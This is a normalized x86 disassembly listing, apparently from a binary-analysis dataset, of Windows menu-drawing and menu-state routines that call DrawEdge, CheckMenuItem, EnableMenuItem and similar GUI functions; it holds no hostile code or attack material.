mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424c70
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424c70
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42bc8c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c44
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4250a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45e6f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42aa80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4244a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a540
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45d754
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424770
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425570
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425274
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45aa58
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425570
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424ff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4244a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032a8
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45d754
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ebbb
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45c818
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_4253ac
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_45d754
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45ed08
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45f6ec
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45ed38
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45ed84
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45ef66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_4034a4
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45ed38
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45f6ec
mov esi eax
mov eax edi
call sub_45ed08
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404444
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4040d0
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_45c818
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404344
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ef6d
lea eax [ ebp - 0x24 ]
call sub_404038
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_45d754
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45ef98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404444
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40408c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45efc0
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45f130
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45f140
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45f008
sub_45f008
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45d6c4
push eax
call CheckMenuItem
mov eax esi
call sub_45efc0
sub_45f05c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45f130
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_45d6c4
push eax
call EnableMenuItem
sub_45f0d4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45f494
mov edx eax
mov ecx ebx
mov eax edi
call sub_45d664
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45efc0
sub_45f140
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4188d4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45c76c
sub_45f1b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45f130
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45f198
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45f4c8
mov ecx ebx
mov edx esi
mov eax edi
call sub_45f2bc
sub_45f1f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45f130
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45f140
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45f250
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45f130
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45f140
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45f140
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45f2bc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_45c76c
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_45d664
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_418950
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45f534
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45f130
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45d594
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4188d4
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4188d4
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45f0d4
sub_45f370
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45c76c
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45f130
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45d594
mov eax ebx
call sub_45f130
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4188d4
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4187c4
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45f3e4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45f008
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45f118
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45f118
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45f4ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45f130
mov edx eax
mov ecx esi
mov eax ebx
call sub_45f2bc
pop esi
pop ebx
retn
sub_45f4c8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45f494
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45f370
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_45c76c
sub_45f4f0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45f534
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45f534
jmp r-xdata
mov eax ebx
call sub_45d594
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_46120c
sub_45f58c
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebx + 0x4c ] eax
sub_45f5b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
